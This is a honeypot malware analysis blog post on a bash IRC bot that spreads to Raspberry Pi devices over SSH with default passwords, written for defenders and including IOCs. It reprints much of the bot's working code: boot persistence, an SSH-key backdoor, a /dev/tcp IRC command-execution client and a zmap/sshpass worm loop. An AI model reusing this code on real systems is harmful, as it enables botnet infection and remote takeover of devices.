---
title: IRC Bots Still Lurking Around
description: Analysis of a bash‑based IRC bot captured in a honeypot
slug: irc-bot-analysis
tags: [SOCcare, security, threat intelligence sharing, ircbot, c2]

hide_table_of_contents: false
---

import SOCcareLogo from './assets/soccare.png';

Some adversaries never get bored of the same, old techniques. This month, we caught in our honeypot a self-spreading Linux malware targeting Raspberry Pi devices.

The script we investigated is a bash-based IRC bot that self-propagates by abusing weak or default SSH passwords. Once enrolled in the botnet, the infected victim awaits for base64 encoded commands signed with the adversary RSA key, effectively enabling authenticated remote command execution over IRC. What makes this incident interesting is not the complexity of the attack - quite the opposite. It highlights how low‑effort techniques still succeed in the wild, especially poorly configured IoT systems.

<!-- truncate -->

In the following sections, we break down the malware's behavior along with code snippets showing the bot’s decision logic and propagation technique.

## Technical overview

From the honeypot we recovered a malicious `bash` script with the following main sections that will be later described with details:
1. Persistence & privilege escalation
2. Environment preparation
3. Remote Execution IRC client
4. Self Propagation

### Persistence & privilege escalation

After successfully connected to the honeypot and dropping the malware, the bot search for persistence and privilege escalation. The first thing the bot does is to copy itself in `/opt` and tamper with `/etc/rc.local` to be executed at every system startup, if connected as a non-root user.

Note: The comments below were added by us for clarification purposes. They don't exist in the original malware sample.

```bash
# Check if the script is NOT running as root
if [ "$EUID" -ne 0 ]
then
    # Copy the malware script to /opt using a random name
	NEWMYSELF=`mktemp -u 'XXXXXXXX'`
	sudo cp $MYSELF /opt/$NEWMYSELF

    # Overwrite /etc/rc.local to ensure the malware runs at every boot
    # rc.local is executed as root during system startup
	sudo sh -c "echo '#!/bin/sh -e' > /etc/rc.local"
	sudo sh -c "echo /opt/$NEWMYSELF >> /etc/rc.local"
	sudo sh -c "echo 'exit 0' >> /etc/rc.local"
	sleep 1

    # Reboot the system to gain persistence and  privilege escalation
	sudo reboot
```

This is not the case for the honeypot session because the adversary is already logged as `root`.

### Environment preparation

Before joining the C2 channel, the script performs an aggressive environment sanitization. This malware is very territorial ensuring that any other competing bot or miner is cleaned from the victim. This approach will guarantee the adversary has exclusive control over the system resources and network bandwidth.

To achieve this, the script begins by killing a wide range of processes associated with other botnets and cryptominers:
```bash
killall bins.sh
killall minerd
killall node
killall nodejs
killall ktx-armv4l
killall ktx-i586
killall ktx-m68k
killall ktx-mips
killall ktx-mipsel
killall ktx-powerpc
killall ktx-sh4
killall ktx-sparc
killall arm5
killall zmap
killall kaiten
killall perl
```

The malware also cuts access to other competitor infrastructure by tampering with the `/etc/hosts` file:
```bash
echo "127.0.0.1 bins[.]deutschland-zahlung[.]eu" >> /etc/hosts
```

Once the environment is cleared, the malware establishes lasting access for itself. It starts by changing the password of the `pi` user:
```bash
usermod -p \$6\$vGkGPKUr\$heqvOhUzvbQ66Nb0JGCijh/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1 pi
```

Next, it installs an SSH public key directly into the root `authorized_keys` file, giving the adversary passwordless access:
```bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B"  >> /root/.ssh/authorized_keys
```

Finally, it deploys the public RSA key used later for validating IRC C2 messages, which will enable authenticated remote command execution:
```bash
cat > /tmp/public.pem <<EOFMARKER
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs
glv7y530TWw2UqNtKjPPA1QXvNsWdiLpTzyvk8mv6ObWBF8hHzvyhJGCadl0v3HW
rXneU1DK+7iLRnkI4PRYYbdfwp92nRza00JUR7P4pghG5SnRK+R/579vIiy+1oAF
WRq+Z8HYMvPlgSRA3wIDAQAB
-----END PUBLIC KEY-----
EOFMARKER
```

### Remote execution IRC client

The juicy part of the malware is the IRC client that acts as a remote command‑execution backdoor by connecting to a dedicated IRC channel and listening for commands. The main `bash` script dynamically generates the IRC client code in a new file in `/tmp/$BOT`. Below is a sample script with comments to describe the bot behavior:

```bash
#!/bin/bash

# Generate a unique bot nickname based on (MD5) hashing of the system info
SYS=`uname -a | md5sum | awk -F' ' '{print $1}'`
NICK=a${SYS:24}
while [ true ]; do
    # List of public Undernet IRC servers (defanged)
    arr[0]="ix1[.]undernet[.]org"
    arr[1]="ix2[.]undernet[.]org"
    arr[2]="Ashburn[.]Va[.]Us[.]UnderNet[.]org"
    arr[3]="Bucharest[.]RO[.]EU[.]UnderNet[.]Org"
    arr[4]="Budapest[.]HU[.]EU[.]UnderNet[.]org"
    arr[5]="Chicago[.]IL[.]US[.]UnderNet[.]org"

    # Choose a random IRC server
	rand=$[$RANDOM % 6]
	svr=${arr[$rand]}

    # Create a TCP connection to port 6667 (IRC) using `/dev/tcp`
    # This is textbook Living-off-the-land technique to create a tcp connection instead of using `netcat`
	eval 'exec 3<>/dev/tcp/$svr/6667;'
	if [[ ! "$?" -eq 0 ]] ; then
			continue
	fi

    # Send an IRC nickname command
	eval 'printf "NICK $NICK\r\n" >&3;'
	if [[ ! "$?" -eq 0 ]] ; then
			continue
	fi

    # Send an IRC USER command (minimal login)
	eval 'printf "USER user 8 * :IRC hi\r\n" >&3;'
	if [[ ! "$?" -eq 0 ]] ; then
		continue
	fi

    # Main loop
	while [ true ]; do
        # Read incoming server messages
		eval "read msg_in <&3;"

		if [[ ! "$?" -eq 0 ]] ; then
			break
		fi

        # Resolve incoming PING messages
		if  [[ "$msg_in" =~ "PING" ]] ; then
            # Respond with PONG messages
			printf "PONG %s\n" "${msg_in:5}";
			eval 'printf "PONG %s\r\n" "${msg_in:5}" >&3;'
			if [[ ! "$?" -eq 0 ]] ; then
				break
			fi
			sleep 1

            # After a successful handshake, join the control channel named `#biret`
			eval 'printf "JOIN #biret\r\n" >&3;'
			if [[ ! "$?" -eq 0 ]] ; then
				break
			fi

        # Handle incoming private messages (potential malicious commands)
		elif [[ "$msg_in" =~ "PRIVMSG" ]] ; then
            # Extract base64‑encoded signature, command, and sender nickname
			privmsg_h=$(echo $msg_in| cut -d':' -f 3)
			privmsg_data=$(echo $msg_in| cut -d':' -f 4)
			privmsg_nick=$(echo $msg_in| cut -d':' -f 2 | cut -d'!' -f 1)

            # Compute MD5 hash of decoded command
			hash=`echo $privmsg_data | base64 -d -i | md5sum | awk -F' ' '{print $1}'`

            # Verify RSA signature using the public key stored in /tmp/public.pem
            # Prevents other IRC users or defenders to hijack the bot
			sign=`echo $privmsg_h | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin`

            # Execute commands only if the signature is valid
			if [[ "$sign" == "$hash" ]] ; then
				CMD=`echo $privmsg_data | base64 -d -i`
				RES=`bash -c "$CMD" | base64 -w 0`

                # Send command output back to sender (base64‑encoded)
				eval 'printf "PRIVMSG $privmsg_nick :$RES\r\n" >&3;'
				if [[ ! "$?" -eq 0 ]] ; then
					break
				fi
			fi
		fi
	done
done
```

Upon further inspection of the traces left behind, we only discovered that some PING messages were exchanged with the IRC server. The bot didn't established a connection with channel named `#biret`, hence, malicious commands were not sent or executed on the victim's machine. Unfortunately, this means that we couldn't really uncover the real goal of the bot.

### Self-propagation

The last step of the malicious shell script is to self-propagate to other victims. In a `while` loop, it scans with `zmap` for hosts with the `ssh` port open. For every responsive IP address found, the script attempts to authenticate using two hardcoded passwords: `raspberry` and `raspberryraspberry993311`.

```bash
while [ true ]; do
	FILE=`mktemp`
    # Scan the Internet for hosts with port 22 (SSH) open.
    # -n 100000 → scan 100k IPs per cycle
    # Output list of responsive IPs to $FILE
	zmap -p 22 -o $FILE -n 100000

    # Kill leftover SSH/SCP processes to avoid buildup
	killall ssh scp

    # Loop through every IP discovered by zmap
	for IP in `cat $FILE`
	do
        # Attempt infection using password "raspberry"
		sshpass -praspberry scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  && echo $IP >> /opt/.r && sshpass -praspberry ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &

        # Attempt infection using second "raspberryraspberry993311"
		sshpass -praspberryraspberry993311 scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  && echo $IP >> /opt/.r && sshpass -praspberryraspberry993311 ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &
	done
    # Clean up temporary scan results
	rm -rf $FILE
    # Clean up temporary scan results
	sleep 10
done
```

## Extracted IOCs

Threat intelligence gathered from analyzing the adversary session are:
- https://www.virustotal.com/gui/file/b32c507a1453527c42596e2f1544497659618e26d94c5e298c419b115e0124b0 - the associated VirusTotal page for the malware file
- https://www.virustotal.com/gui/ip-address/88.147.18.235 - the source adversary IP `88.147.18.235`
- The sha256 of the file is `b32c507a1453527c42596e2f1544497659618e26d94c5e298c419b115e0124b0`
- Credentials used for the initial ssh connection are `pi/raspberryraspberry993311`

## How long has this been around?

After doing a bit of research on connected attacks, it seems that this malware isn't exactly new. The credentials used -`pi/raspberryraspberry993311` - are mentioned in a [TrendMicro report published back in 2020](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/backdoor.sh.pimine.aa). It seems that the malware variant from TrendMicro didn't attempt to connect to the IRC channel `#biret`.

Also, the same `username:password` pair is mentioned in a [list of common credentials used in IoT attacks published by Bitdefender](https://www.bitdefender.com/en-us/blog/hotforsecurity/common-credentials-criminals-use-in-iot-dictionary-attacks-revealed).

A [public gist created in May, 2023](https://gist.github.com/kawaiipantsu/8fac33724f0b1c648bfc0f599bbf9f1d), publishes the same malware sample featuring the same public SSH key, password hash and credentials tried. The author mentions that the ultimate goal of this malware is to mine cryptocurrency on the infected IoT devices.

What makes the older cases interesting is the overlap with our sample: the same `username:password` pair was mentioned by Bitdefender and TrendMicro. This implies that a basic version of the malware remained unchanged across several years. In the incident investigated by us the IRC bot client that connects to `#biret` was introduced on top of what TrendMicro reported a while back. This feature is also highlighted in a [SANS diary post](https://isc.sans.edu/diary/28998) and in the gist malware sample mentioned above. This suggests that the adversary may have taken an older, well-established script and expanded its functionality.

## Conclusions

Overall, the malware does a poor job at hiding the traces during its execution. Although it attempts to clean up after itself, it still generates some temporary files  allowing the honeypot to capture helpful information.

From these artifacts, we've been able to confirm that the bot only responded to a few PING messages and never successfully joined the intended C2 channel (`#biret`). Additionally, no evidence suggests that the malware was able to propagate further. The honeypot logs show that the entire session lasted only 22 seconds before the attacker disconnected, leaving no signs of successful lateral movement or follow‑up infections.

### SOCcare

The SOCcare project is co-funded by the European Union, alongside our collaborators,
NRD Cyber Security and RevelSI, and supported by the
European Cybersecurity Competence Centre (ECCC) Centre (ECCC) under Grant Agreement No. 101145843.
Views and opinions expressed are however those of the author(s) only and do not necessarily
reflect those of the European Union or the European Cybersecurity Competence Centre.
Neither the European Union nor the European Cybersecurity Competence Centre can be held responsible for them.

<img src={SOCcareLogo} width="600"/>
